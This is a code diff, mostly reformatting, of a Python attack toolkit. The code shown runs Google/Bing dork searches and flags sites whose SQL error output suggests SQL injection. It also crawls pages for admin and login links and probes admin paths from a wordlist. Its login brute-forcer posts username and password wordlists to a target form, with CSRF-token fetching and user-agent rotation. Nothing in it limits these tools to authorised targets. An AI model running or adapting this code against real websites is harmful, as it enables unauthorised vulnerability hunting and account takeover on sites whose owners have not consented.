-                                    sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
-                                    print(f'\n{error}{BR} Error Text: {W}{__vuln}')
-                                    print(f'{printout}{BB} Url: {P}{scan}\n')
-                                    break
-                                  else:
-                                    sys.stdout.write("\r"+whitespace)
-                                    sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
-                                    #print(f'{BB}[URL]{W} : {self.url}')
-                                    text = "{}\n".format(scan)
-                                    temp = open("./.temp/" + filetemp, "a+")
-                                    temp.writelines(text)
-                                    temp.close()
-                                    break
-                                    pass
-                                  time.sleep(0.02)
-
-                          except Exception as e:
-                            print(BR+e)
-
-                          except KeyboardInterrupt:
-                            pause = str(input(f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"))
-
-                            if pause == "X" or pause == "x":
-                              if os.path.exists("./.temp/" + vulntemp):
-                                c = open("./.temp/" + vulntemp, "r")
-                                name = "./output/vulnsqli/" + nm + "vuln.txt"
-                                content = c.read()
-                                c.close()
-                                os.remove("./.temp/" + vulntemp)
-                                save_file(name, content, 2)
-
-                                if os.path.exists("./.temp/" + filetemp):
-                                  sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
-                                  if sv.isspace() or "" in sv:
-                                    sv = "n"
-                                  if sv == "y" or sv == "Y":
-                                      if os.path.exists("./.temp/" + filetemp):
-                                          removeDups(filetemp)
-                                          c = open("./.temp/" + filetemp, "r")
-                                          name = "./output/dorkscan/" + nm + ".txt"
-                                          content = c.read()
-                                          c.close()
-                                          os.remove("./.temp/" + filetemp)
-                                          save_file(name, content, 1)
-                                      else:
-                                          input(f"\n{fail}{BO} Nothing is Saved!")
-
-                                  else:
-                                      os.remove("./.temp/" + filetemp)
-                                      input(f"\n{fail}{BO} Nothing is Saved!")
-                                else:
-                                  input("")
-                                main()
-
-                              else:
-                                if os.path.exists("./.temp/" + filetemp):
-                                  sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
-                                  if sv.isspace() or "" in sv:
-                                    sv = "n"
-                                  if sv == "y" or sv == "Y":
-                                      if os.path.exists("./.temp/" + filetemp):
-                                          removeDups(filetemp)
-                                          c = open("./.temp/" + filetemp, "r")
-                                          name = "./output/dorkscan/" + nm + ".txt"
-                                          content = c.read()
-                                          c.close()
-                                          os.remove("./.temp/" + filetemp)
-                                          save_file(name, content, 1)
-                                      else:
-                                          input(f"\n{fail}{BO} Nothing is Saved!")
-
-                                  else:
-                                      os.remove("./.temp/" + filetemp)
-                                      input(f"\n{fail}{BO} Nothing is Saved!")
-                                else:
-                                  input(f"\n{fail}{BO} Nothing is Saved!")
-                              main()
-                              break
-
-                            else:
-                              pass
-
-                      except Exception:
-                        sys.stdout.write("\r"+whitespace)
-                        sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
+                        sys.stdout.write("\r" + whitespace)
+                        sys.stdout.write(
+                          f'\n{success}{BG} Vulnerability SQLi!')
+                        print(f'\n{error}{BR} Error Text: {W}{__vuln}')
+                        print(f'{printout}{BB} Url: {P}{scan}\n')
+                        break
+                      else:
+                        sys.stdout.write("\r" + whitespace)
+                        sys.stdout.write(
+                          f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                         #print(f'{BB}[URL]{W} : {self.url}')
                         text = "{}\n".format(scan)
                         temp = open("./.temp/" + filetemp, "a+")
                         temp.writelines(text)
                         temp.close()
-                        pass
-
-                if os.path.exists("./.temp/" + vulntemp):
-                  c = open("./.temp/" + vulntemp, "r")
-                  name = "./output/vulnsqli/" + nm + "vuln.txt"
-                  content = c.read()
-                  c.close()
-                  os.remove("./.temp/" + vulntemp)
-                  save_file(name, content, 2)
-                  if os.path.exists("./.temp/" + filetemp):
-                    sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
-                    if sv.isspace() or "" in sv:
-                      sv = "n"
-                    if sv == "y" or sv == "Y":
-                        if os.path.exists("./.temp/" + filetemp):
-                            removeDups(filetemp)
-                            c = open("./.temp/" + filetemp, "r")
-                            name = "./output/dorkscan/" + nm + ".txt"
-                            content = c.read()
-                            c.close()
-                            os.remove("./.temp/" + filetemp)
-                            save_file(name, content, 1)
-                        else:
-                            input(f"\n{fail}{BO} Nothing is Saved!")
-
-                    else:
-                        os.remove("./.temp/" + filetemp)
-                        input(f"\n{fail}{BO} Nothing is Saved!")
-                  else:
-                    input("")
-
-                else:
-                  if os.path.exists("./.temp/" + filetemp):
-                    sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
-                    if sv.isspace() or "" in sv:
-                      sv = "n"
-                    if sv == "y" or sv == "Y":
-                        if os.path.exists("./.temp/" + filetemp):
-                            removeDups(filetemp)
-                            c = open("./.temp/" + filetemp, "r")
-                            name = "./output/dorkscan/" + nm + ".txt"
-                            content = c.read()
-                            c.close()
-                            os.remove("./.temp/" + filetemp)
-                            save_file(name, content, 1)
-                        else:
-                            input(f"\n{fail}{BO} Nothing is Saved!")
-
-                    else:
-                        os.remove("./.temp/" + filetemp)
-                        input(f"\n{fail}{BO} Nothing is Saved!")
-                  else:
-                    input("")
-                main()          
-            else:
-              input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
-              main()
-          else:
-             input(invalid)   
-
-      elif _scan == "n":
-          if _dork != None:
-            _ = crawl(_dork,proxy=proxy)
-            _.Bing()
-            _.Google()
-            sys.stdout.write(f"\r{success}{BG} Getting Url Success!\n\n")
-            with open("./src/adminpages.txt", 'r') as r:
-              admfound = r.read().splitlines()
-            time.sleep(0.5)
-            if urls != []:
-                for url in list(set(urls)):
-                  try:
-                    adm = 0
-                    nml = 0
-                    for adm in admfound:
-                      if adm in url:
-                        print(loginfound+P+' {}'.format(url))
-                        text = "\nUrl: {}".format(url)
-                        temp = open("./.temp/" + filetemp2, "a+")
-                        temp.writelines(text)
-                        temp.close()
-                        adm = 1
-                        nml = 1
                         break
-                      time.sleep(0.005)
+                        pass
+                      time.sleep(0.02)
 
-                    if nml == 0:
-                      print(printout+BO+' {}'.format(url))
-                      text = "{}\n".format(url)
-                      temp = open("./.temp/" + filetemp, "a+")
-                      temp.writelines(text)
-                      temp.close()
-                      break
+                except Exception as e:
+                  print(BR + e)
 
+                except KeyboardInterrupt:
+                  pause = str(
+                    input(
+                      f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"
+                    ))
 
-                  except KeyboardInterrupt:
-                    if os.path.exists("./.temp/" + filetemp):
-                      removeDups(filetemp)
-                      c = open("./.temp/" + filetemp, "r")
-                      name = "./output/dorkscan/" + nm + ".txt"
+                  if pause == "X" or pause == "x":
+                    if os.path.exists("./.temp/" + vulntemp):
+                      c = open("./.temp/" + vulntemp, "r")
+                      name = "./output/vulnsqli/" + nm + "vuln.txt"
                       content = c.read()
                       c.close()
-                      os.remove("./.temp/" + filetemp)
-                      save_file(name, content, 1)
-                    else:
-                      input(f"\n{fail}{BO} Nothing is Saved!")
+                      os.remove("./.temp/" + vulntemp)
+                      save_file(name, content, 2)
 
-                    if (adm == 1):
-                      #admnm = urlparse(url).hostname
-                      if os.path.exists("./.temp/" + filetemp2):
-                        removeDups(filetemp2)
-                        c = open("./.temp/" + filetemp2, "r")
-                        name = "./output/adminfind/" + nm + ".txt"
-                        content = c.read()
-                        c.close()
-                        os.remove("./.temp/" + filetemp2)
-                        save_file(name, content, 3)
+                      if os.path.exists("./.temp/" + filetemp):
+                        sv = input(
+                          f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: "
+                        )
+                        if sv.isspace() or "" in sv:
+                          sv = "n"
+                        if sv == "y" or sv == "Y":
+                          if os.path.exists("./.temp/" + filetemp):
+                            removeDups(filetemp)
+                            c = open("./.temp/" + filetemp, "r")
+                            name = "./output/dorkscan/" + nm + ".txt"
+                            content = c.read()
+                            c.close()
+                            os.remove("./.temp/" + filetemp)
+                            save_file(name, content, 1)
+                          else:
+                            input(f"\n{fail}{BO} Nothing is Saved!")
+
+                        else:
+                          os.remove("./.temp/" + filetemp)
+                          input(f"\n{fail}{BO} Nothing is Saved!")
+                      else:
+                        input("")
+                      main()
+
+                    else:
+                      if os.path.exists("./.temp/" + filetemp):
+                        sv = input(
+                          f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: "
+                        )
+                        if sv.isspace() or "" in sv:
+                          sv = "n"
+                        if sv == "y" or sv == "Y":
+                          if os.path.exists("./.temp/" + filetemp):
+                            removeDups(filetemp)
+                            c = open("./.temp/" + filetemp, "r")
+                            name = "./output/dorkscan/" + nm + ".txt"
+                            content = c.read()
+                            c.close()
+                            os.remove("./.temp/" + filetemp)
+                            save_file(name, content, 1)
+                          else:
+                            input(f"\n{fail}{BO} Nothing is Saved!")
+
+                        else:
+                          os.remove("./.temp/" + filetemp)
+                          input(f"\n{fail}{BO} Nothing is Saved!")
                       else:
                         input(f"\n{fail}{BO} Nothing is Saved!")
+                    main()
+                    break
 
+                  else:
+                    pass
+
+              except Exception:
+                sys.stdout.write("\r" + whitespace)
+                sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
+                #print(f'{BB}[URL]{W} : {self.url}')
+                text = "{}\n".format(scan)
+                temp = open("./.temp/" + filetemp, "a+")
+                temp.writelines(text)
+                temp.close()
+                pass
+
+            if os.path.exists("./.temp/" + vulntemp):
+              c = open("./.temp/" + vulntemp, "r")
+              name = "./output/vulnsqli/" + nm + "vuln.txt"
+              content = c.read()
+              c.close()
+              os.remove("./.temp/" + vulntemp)
+              save_file(name, content, 2)
+              if os.path.exists("./.temp/" + filetemp):
+                sv = input(
+                  f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
+                if sv.isspace() or "" in sv:
+                  sv = "n"
+                if sv == "y" or sv == "Y":
+                  if os.path.exists("./.temp/" + filetemp):
+                    removeDups(filetemp)
+                    c = open("./.temp/" + filetemp, "r")
+                    name = "./output/dorkscan/" + nm + ".txt"
+                    content = c.read()
+                    c.close()
+                    os.remove("./.temp/" + filetemp)
+                    save_file(name, content, 1)
+                  else:
+                    input(f"\n{fail}{BO} Nothing is Saved!")
+
+                else:
+                  os.remove("./.temp/" + filetemp)
+                  input(f"\n{fail}{BO} Nothing is Saved!")
+              else:
+                input("")
+
+            else:
+              if os.path.exists("./.temp/" + filetemp):
+                sv = input(
+                  f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
+                if sv.isspace() or "" in sv:
+                  sv = "n"
+                if sv == "y" or sv == "Y":
+                  if os.path.exists("./.temp/" + filetemp):
+                    removeDups(filetemp)
+                    c = open("./.temp/" + filetemp, "r")
+                    name = "./output/dorkscan/" + nm + ".txt"
+                    content = c.read()
+                    c.close()
+                    os.remove("./.temp/" + filetemp)
+                    save_file(name, content, 1)
+                  else:
+                    input(f"\n{fail}{BO} Nothing is Saved!")
+
+                else:
+                  os.remove("./.temp/" + filetemp)
+                  input(f"\n{fail}{BO} Nothing is Saved!")
+              else:
+                input("")
+            main()
+          else:
+            input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
+            main()
+        else:
+          input(invalid)
+
+      elif _scan == "n":
+        if _dork != None:
+          _ = crawl(_dork, proxy=proxy)
+          _.Bing()
+          _.Google()
+          sys.stdout.write(f"\r{success}{BG} Getting Url Success!\n\n")
+          with open("./src/adminpages.txt", 'r') as r:
+            admfound = r.read().splitlines()
+          time.sleep(0.5)
+          if urls != []:
+            for url in list(set(urls)):
+              try:
+                adm = 0
+                nml = 0
+                for adm in admfound:
+                  if adm in url:
+                    print(loginfound + P + ' {}'.format(url))
+                    text = "\nUrl: {}".format(url)
+                    temp = open("./.temp/" + filetemp2, "a+")
+                    temp.writelines(text)
+                    temp.close()
+                    adm = 1
+                    nml = 1
+                    break
+                  time.sleep(0.005)
+
+                if nml == 0:
+                  print(printout + BO + ' {}'.format(url))
+                  text = "{}\n".format(url)
+                  temp = open("./.temp/" + filetemp, "a+")
+                  temp.writelines(text)
+                  temp.close()
+                  break
+
+              except KeyboardInterrupt:
                 if os.path.exists("./.temp/" + filetemp):
                   removeDups(filetemp)
                   c = open("./.temp/" + filetemp, "r")
@@ -1304,58 +1282,169 @@ Error: {err}\n\n"""
                     save_file(name, content, 3)
                   else:
                     input(f"\n{fail}{BO} Nothing is Saved!")
-              
+
+            if os.path.exists("./.temp/" + filetemp):
+              removeDups(filetemp)
+              c = open("./.temp/" + filetemp, "r")
+              name = "./output/dorkscan/" + nm + ".txt"
+              content = c.read()
+              c.close()
+              os.remove("./.temp/" + filetemp)
+              save_file(name, content, 1)
             else:
-              input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
-            main()
+              input(f"\n{fail}{BO} Nothing is Saved!")
+
+            if (adm == 1):
+              #admnm = urlparse(url).hostname
+              if os.path.exists("./.temp/" + filetemp2):
+                removeDups(filetemp2)
+                c = open("./.temp/" + filetemp2, "r")
+                name = "./output/adminfind/" + nm + ".txt"
+                content = c.read()
+                c.close()
+                os.remove("./.temp/" + filetemp2)
+                save_file(name, content, 3)
+              else:
+                input(f"\n{fail}{BO} Nothing is Saved!")
+
           else:
-            input(f"{error}{BR} Input Dork!") 
-            self.main()
-      else:           
-         input(invalid)
-         self.main()
+            input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
+          main()
+        else:
+          input(f"{error}{BR} Input Dork!")
+          self.main()
+      else:
+        input(invalid)
+        self.main()
     except Exception as e:
-      input(BR+str(e))
+      input(BR + str(e))
       main()
     except KeyboardInterrupt:
       cancel()
 
+
 #Web Crawler =====================================
 class crawler():
-    def crawl_func(self,mode):
-      try:
-        os.system(clrcmd)
-        print(banner)
-        print(f"{W}[{BR}@{W}]{BG} Web Crawler {W}")
 
-        if (mode == 1):
-          filetemp = str(uuid.uuid4())
-          filetemp2 = str(uuid.uuid4())
-          s_url = str(
-            input(f" └─[{BO}Url{W}]{P} "))
+  def crawl_func(self, mode):
+    try:
+      os.system(clrcmd)
+      print(banner)
+      print(f"{W}[{BR}@{W}]{BG} Web Crawler {W}")
+
+      if (mode == 1):
+        filetemp = str(uuid.uuid4())
+        filetemp2 = str(uuid.uuid4())
+        s_url = str(input(f" └─[{BO}Url{W}]{P} "))
+        if "http://" in s_url or "https://" in s_url:
+          s_url = s_url
+          n_url = urlparse(s_url).hostname
+        else:
+          n_url = s_url
+          s_url = "http://" + s_url
+
+        try:
+          checkConnection("http://" + n_url, 1)
+        except:
+          main()
+        print(f"\n{loading}{BO} Crawling Site...")
+        try:
+          response = requests.get(s_url)
+          linkList = re.findall('(?:href=")(.*?)"',
+                                response.content.decode('utf8'))
+          print(f"\n{success}{BG} Site Crawl Successful !!")
+
+          print(f"\n{loading}{BB} Printing Site...\n")
+          continues = 1
+        except Exception as e:
+          continues = 0
+          input(f"{error}{BR} Error Crawling Site Error Code: " + str(e))
+
+        adm = 0
+        if continues == 1:
+          for link in linkList:
+            link = urljoin(s_url, link)
+            if "admin" in link or "login" in link:
+              print(f"{loginfound}{BG} {link}")
+              text = "\nUrl: {}".format(link)
+              temp = open("./.temp/" + filetemp2, "a+")
+              temp.writelines(text)
+              temp.close()
+              time.sleep(0.05)
+              adm = 1
+            else:
+              print(printout + O + " " + link)
+              text = "{}\n".format(link)
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
+              time.sleep(0.05)
+
+        elif continues == 0:
+          main()
+
+        if os.path.exists("./.temp/" + filetemp):
+          removeDups(filetemp)
+          c = open("./.temp/" + filetemp, "r")
+          name = "./output/crawler/" + n_url + ".txt"
+          content = c.read()
+          c.close()
+          os.remove("./.temp/" + filetemp)
+          save_file(name, content, 1)
+        else:
+          input(f"\n{fail}{BO} Nothing is Saved!")
+
+        if (adm == 1):
+          if os.path.exists("./.temp/" + filetemp):
+            removeDups(filetemp)
+            c = open("./.temp/" + filetemp, "r")
+            name = "./output/adminfind/" + n_url + ".txt"
+            content = c.read()
+            c.close()
+            os.remove("./.temp/" + filetemp)
+            save_file(name, content, 3)
+          else:
+            input(f"\n{fail}{BO} Nothing is Saved!")
+        main()
+
+      elif (mode == 2):
+        filetemp = str(uuid.uuid4())
+        filetemp2 = str(uuid.uuid4())
+        print(f" ├─[{PINK}Path e.g: lists.txt{W}]")
+        print(f"{W} │")
+        path = str(input(f" └─[{BO}Path{W}]{P} "))
+        if not os.path.exists(path):
+          input(f"{error}{BR} File Does Not Exists!")
+          self.crawl_func(mode)
+        with open(path, 'r') as f:
+          crwlists = f.read().splitlines()
+        print("\n")
+        for crwlist in crwlists:
+
+          s_url = crwlist
           if "http://" in s_url or "https://" in s_url:
             s_url = s_url
             n_url = urlparse(s_url).hostname
           else:
             n_url = s_url
             s_url = "http://" + s_url
-        
+
           try:
-            checkConnection("http://"+n_url,1)
+            checkConnection("http://" + n_url, 0)
           except:
             main()
           print(f"\n{loading}{BO} Crawling Site...")
           try:
             response = requests.get(s_url)
             linkList = re.findall('(?:href=")(.*?)"',
-                              response.content.decode('utf8'))
+                                  response.content.decode('utf8'))
             print(f"\n{success}{BG} Site Crawl Successful !!")
 
-            print(f"\n{loading}{BB} Printing Site...\n")
+            print(f"\n{success}{BB} Printing Site...\n")
             continues = 1
           except Exception as e:
             continues = 0
-            input(f"{error}{BR} Error Crawling Site Error Code: "+ str(e))
+            input(f"{error}{BR} Error Crawling Site Error Code: " + str(e))
 
           adm = 0
           if continues == 1:
@@ -1378,8 +1467,8 @@ class crawler():
                 time.sleep(0.05)
 
           elif continues == 0:
-              main()
-            
+            pass
+
           if os.path.exists("./.temp/" + filetemp):
             removeDups(filetemp)
             c = open("./.temp/" + filetemp, "r")
@@ -1387,10 +1476,9 @@ class crawler():
             content = c.read()
             c.close()
             os.remove("./.temp/" + filetemp)
-            save_file(name, content, 1)
+            save_file(name, content, 2)
           else:
-            input(f"\n{fail}{BO} Nothing is Saved!")
-          
+            print(f"\n{fail}{BO} Nothing is Saved!")
 
           if (adm == 1):
             if os.path.exists("./.temp/" + filetemp):
@@ -1400,99 +1488,14 @@ class crawler():
               content = c.read()
               c.close()
               os.remove("./.temp/" + filetemp)
-              save_file(name, content, 3)
-            else:
-              input(f"\n{fail}{BO} Nothing is Saved!")
-          main()
-
-        elif (mode == 2):
-          filetemp = str(uuid.uuid4())
-          filetemp2 = str(uuid.uuid4())
-          print(f" ├─[{PINK}Path e.g: lists.txt{W}]")
-          print(f"{W} │")
-          path = str(input(f" └─[{BO}Path{W}]{P} "))
-          if not os.path.exists(path):
-            input(f"{error}{BR} File Does Not Exists!")
-            self.crawl_func(mode)
-          with open(path, 'r') as f:
-            crwlists = f.read().splitlines()
-          print("\n")
-          for crwlist in crwlists:
-
-            s_url = crwlist
-            if "http://" in s_url or "https://" in s_url:
-              s_url = s_url
-              n_url = urlparse(s_url).hostname
-            else:
-              n_url = s_url
-              s_url = "http://" + s_url
-
-            try:
-              checkConnection("http://"+n_url,0)
-            except:
-              main()
-            print(f"\n{loading}{BO} Crawling Site...")
-            try:
-              response = requests.get(s_url)
-              linkList = re.findall('(?:href=")(.*?)"',
-                                response.content.decode('utf8'))
-              print(f"\n{success}{BG} Site Crawl Successful !!")
-
-              print(f"\n{success}{BB} Printing Site...\n")
-              continues = 1
-            except Exception as e:
-              continues = 0
-              input(f"{error}{BR} Error Crawling Site Error Code: "+ str(e))
-
-            adm = 0
-            if continues == 1:
-              for link in linkList:
-                link = urljoin(s_url, link)
-                if "admin" in link or "login" in link:
-                  print(f"{loginfound}{BG} {link}")
-                  text = "\nUrl: {}".format(link)
-                  temp = open("./.temp/" + filetemp2, "a+")
-                  temp.writelines(text)
-                  temp.close()
-                  time.sleep(0.05)
-                  adm = 1
-                else:
-                  print(printout + O + " " + link)
-                  text = "{}\n".format(link)
-                  temp = open("./.temp/" + filetemp, "a+")
-                  temp.writelines(text)
-                  temp.close()
-                  time.sleep(0.05)
-
-            elif continues == 0:
-              pass
-
-            if os.path.exists("./.temp/" + filetemp):
-              removeDups(filetemp)
-              c = open("./.temp/" + filetemp, "r")
-              name = "./output/crawler/" + n_url + ".txt"
-              content = c.read()
-              c.close()
-              os.remove("./.temp/" + filetemp)
-              save_file(name, content, 2)
+              save_file(name, content, 4)
             else:
               print(f"\n{fail}{BO} Nothing is Saved!")
+          time.sleep(2)
+        main()
+    except KeyboardInterrupt:
+      cancel()
 
-            if (adm == 1):
-              if os.path.exists("./.temp/" + filetemp):
-                removeDups(filetemp)
-                c = open("./.temp/" + filetemp, "r")
-                name = "./output/adminfind/" + n_url + ".txt"
-                content = c.read()
-                c.close()
-                os.remove("./.temp/" + filetemp)
-                save_file(name, content, 4)
-              else:
-                print(f"\n{fail}{BO} Nothing is Saved!")
-            time.sleep(2)
-          main()
-      except KeyboardInterrupt:
-        cancel()
 
 #Admin Finder =====================================
 class ADMF():
@@ -1502,16 +1505,15 @@ class ADMF():
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Admin Finder {W}")
       filetemp = str(uuid.uuid4())
-      s_url = str(
-        input(f" └─[{BO}Url{W}]{P} "))
+      s_url = str(input(f" └─[{BO}Url{W}]{P} "))
       if "http://" in s_url or "https://" in s_url:
         s_url = s_url
         n_url = urlparse(s_url).hostname
       else:
         n_url = s_url
         s_url = "http://" + s_url
-        
-      checkConnection("http://"+n_url,1)
+
+      checkConnection("http://" + n_url, 1)
 
       with open('./src/adminpages.txt', 'r') as f:
         adminpages = f.read().splitlines()
@@ -1529,8 +1531,8 @@ class ADMF():
               temp.close()
             else:
               sys.stdout.write("\r" + whitespace)
-              sys.stdout.write("\r"+ notfound + R +
-                                 " " + s_url + "/" + adminpage)
+              sys.stdout.write("\r" + notfound + R + " " + s_url + "/" +
+                               adminpage)
           except requests.exceptions.ConnectionError:
             print(f"\n{ercon}{R} {s_url}/{adminpage}\n")
         except KeyboardInterrupt:
@@ -1598,11 +1600,11 @@ class LOG():
       print(f" ├─[{PINK}Add -csrf for enable csrf-token]")
       print(f"{W} │")
       _input = input(f" └─[{BO}Target{W}]{P} ")
-      _input = _input.replace(" ", "" )
+      _input = _input.replace(" ", "")
 
       if "-csrf" in _input:
         _csrf = 1
-        _input = _input.replace("-csrf", "" )
+        _input = _input.replace("-csrf", "")
 
       target = _input
       os.system(clrcmd)
@@ -1617,7 +1619,8 @@ class LOG():
       else:
         user = user
 
-      passwd = str(input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
+      passwd = str(
+        input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
       if passwd == "" or passwd == " ":
         passwd = "./src/passwords.txt"
         bfmode = 2
@@ -1631,7 +1634,6 @@ class LOG():
           passwd = passwd
 
       user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
-        
 
       if _csrf == 1:
         password_field = str(input(f"{W} ├─[{BO}Pass Field{W}]{BB} "))
@@ -1653,72 +1655,74 @@ class LOG():
         input("Mode 0, Username & Password normal")
         pass'''
 
-
-
-      self.run(target, user, passwd, user_field, password_field, csrf_field, csrf, bfmode)
+      self.run(target, user, passwd, user_field, password_field, csrf_field,
+               csrf, bfmode)
 
     except KeyboardInterrupt:
       cancel()
 
   def blocks(self, files, size=65536):
     while True:
-        b = files.read(size)
-        if not b: break
-        yield b
+      b = files.read(size)
+      if not b: break
+      yield b
 
-
-  def run(self, url, user, passwd, user_field, password_field, csrf_field, csrf, bfmode):
+  def run(self, url, user, passwd, user_field, password_field, csrf_field,
+          csrf, bfmode):
     n_url = urlparse(url).hostname
     totaluser = 1
     totalwordlist = 1
     filetemp = str(uuid.uuid4())
 
     if csrf == 1:
-      _csrf_token = O+csrf_field
+      _csrf_token = O + csrf_field
     else:
-      _csrf_token = W+csrf_field
+      _csrf_token = W + csrf_field
 
     if bfmode == 1:
-      user_size = os.path.getsize(user) >>20
+      user_size = os.path.getsize(user) >> 20
       if user_size < 100:
         with open(user) as f:
           totaluser = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-          totaluser="unknown"
+        totaluser = "unknown"
 
     elif bfmode == 2:
-      passwd_size = os.path.getsize(passwd) >>20
+      passwd_size = os.path.getsize(passwd) >> 20
       if passwd_size < 100:
         with open(passwd) as f:
           totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-          totalwordlist="unknown"
+        totalwordlist = "unknown"
 
     elif bfmode == 3:
-      user_size = os.path.getsize(user) >>20
+      user_size = os.path.getsize(user) >> 20
       if user_size < 100:
         with open(user) as f:
           totaluser = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-          totaluser="unknown"
+        totaluser = "unknown"
 
-      passwd_size = os.path.getsize(passwd) >>20
+      passwd_size = os.path.getsize(passwd) >> 20
       if passwd_size < 100:
         with open(passwd) as f:
           totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
       else:
-          totalwordlist="unknown"
+        totalwordlist = "unknown"
 
     print(f"\n{success}{BB} Target.......: {P}{url}")
-    print(f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
-    print(f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]")
+    print(
+      f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
+    print(
+      f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]"
+    )
     print(f"{success}{BB} User Field...: {O}{user_field}")
     print(f"{success}{BB} Pass Field...: {O}{password_field}")
     print(f"{success}{BB} CSRF-Token...: {_csrf_token}{W}")
 
-    checkConnection(url,1)
+    checkConnection(url, 1)
 
-    listAgent= open("./src/UserAgent.txt", "r")
+    listAgent = open("./src/UserAgent.txt", "r")
     Agent = listAgent.read().splitlines()
     Ua = random.choice(Agent)
     header = {'User-Agent': Ua}
@@ -1737,16 +1741,25 @@ class LOG():
       with open(user) as usrlist:
         try:
           for usr in usrlist:
-            cnt = W+"["+BO+str(count)+'/'+totaluser+W+"]"
+            cnt = W + "[" + BO + str(count) + '/' + totaluser + W + "]"
 
             if csrf == 1:
-              payload = {user_field: usr.replace('\n', ''),password_field: passwd,csrf_field: self.get_csrf_token(url, csrf_field)}
+              payload = {
+                user_field: usr.replace('\n', ''),
+                password_field: passwd,
+                csrf_field: self.get_csrf_token(url, csrf_field)
+              }
 
             else:
-              payload = {user_field: usr.replace('\n', ''),password_field: passwd}
+              payload = {
+                user_field: usr.replace('\n', ''),
+                password_field: passwd
+              }
 
-            progress = BO+" User: "+P+usr.replace('\n', '')+BO+" Pass: "+P+passwd
-            save = str(no)+" | "+url+" | "+usr.replace('\n', '')+" | "+passwd
+            progress = BO + " User: " + P + usr.replace(
+              '\n', '') + BO + " Pass: " + P + passwd
+            save = str(no) + " | " + url + " | " + usr.replace(
+              '\n', '') + " | " + passwd
 
             req = requests.post(url, data=payload, headers=header)
 
@@ -1762,23 +1775,28 @@ class LOG():
               with term.location(x=0, y=26):
                 print(f"{success}{BB} Payload: {W}{payload}")
               print(f"{whitespace}", end='\r')
-              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
               break
-              
+
             else:
               with term.location(x=0, y=26):
                 print(whitespace)
               with term.location(x=0, y=26):
                 print(f"{success}{BB} Payload: {W}{payload}")
               print(f"{whitespace}", end='\r')
-              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}", end='\r')
+              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
+                    end='\r')
 
             sleep(0.010)
             count += 1
-        
+
         except KeyboardInterrupt:
-          pause = str(input(f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"))
-            
+          pause = str(
+            input(
+              f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
+            ))
+
           if pause == "X" or pause == "x":
             if os.path.exists("./.temp/" + filetemp):
               c = open("./.temp/" + filetemp, "r")
@@ -1800,7 +1818,7 @@ class LOG():
                 main()
 
           else:
-            text =f"{save}\n"
+            text = f"{save}\n"
             temp = open("./.temp/" + filetemp, "a+")
             temp.writelines(text)
             temp.close()
@@ -1817,52 +1835,62 @@ class LOG():
       input(f"\n{error}{BR} Username Not Found!")
       main()
 
-
     elif bfmode == 2:
       with open(passwd) as wordlist:
-          try:
-              for pwd in wordlist:
-                cnt = W+"["+BO+str(count)+'/'+totalwordlist+W+"]"
+        try:
+          for pwd in wordlist:
+            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"
 
-                if csrf == 1:
-                  payload = {user_field: user,password_field: pwd.replace('\n', ''),csrf_field: self.get_csrf_token(url, csrf_field)}
+            if csrf == 1:
+              payload = {
+                user_field: user,
+                password_field: pwd.replace('\n', ''),
+                csrf_field: self.get_csrf_token(url, csrf_field)
+              }
 
-                else:
-                  payload = {user_field: user,password_field: pwd.replace('\n', '')}
+            else:
+              payload = {
+                user_field: user,
+                password_field: pwd.replace('\n', '')
+              }
 
-                progress = BO+" User: "+P+user+BO+" Pass: "+P+pwd.replace('\n', '')
-                save = str(no)+" | "+url+" | "+user+" | "+pwd.replace('\n', '')
+            progress = BO + " User: " + P + user + BO + " Pass: " + P + pwd.replace(
+              '\n', '')
+            save = str(no) + " | " + url + " | " + user + " | " + pwd.replace(
+              '\n', '')
 
-                req = requests.post(url, data=payload, headers=header)
+            req = requests.post(url, data=payload, headers=header)
 
-                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
-                  usrcnt += 1
-                  no += 1
-                  text = f"{save}\n"
-                  temp = open("./.temp/" + filetemp, "a+")
-                  temp.writelines(text)
-                  temp.close()
